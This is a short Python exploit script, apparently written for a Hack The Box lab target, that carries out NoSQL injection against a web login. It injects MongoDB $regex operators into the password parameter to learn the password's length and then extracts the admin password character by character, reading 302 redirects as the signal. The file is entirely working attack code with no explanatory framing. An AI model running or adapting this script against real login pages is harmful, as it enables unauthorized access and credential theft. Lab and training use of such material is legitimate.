import requests
import urllib3
import string
import urllib

urllib3.disable_warnings()

USERNAME = "mango"
PASSWORD = ""
BASE_URL = "http://staging-order.mango.htb/"
HEADERS = { "Content-Type" : "application/x-www-form-urlencoded" }
_LST = string.printable

def get_length():
	_length = "0123456789"
	for num in range(0, 100):
		raw = 'username=mango&password[$regex]=.\{%s\}' % num
		payload = urllib.parse.quote(raw)
		print("[+] Trying {}\r".format(num), end="")
		r = requests.post(BASE_URL, data = payload, headers = HEADERS, allow_redirects = False)
		if r.status_code == 302:
			print("\n\n[+] LENGTH IS : {}".format(num))
			break

def engine():
	global PASSWORD
	while True:
		for _char in _LST:
			if _char not in ['*','+','.','?','|', '$', '^', '&', '.']:
				payload = 'username=admin&password[$regex]=^{}'.format(PASSWORD + _char)
				r = requests.post(BASE_URL, data = payload, headers = HEADERS, allow_redirects = False)
				if r.status_code == 302:
					print("[+] Character found : {}\r".format(PASSWORD + _char), end="")
					PASSWORD += _char
					break

if "__main__" in __name__:
	engine()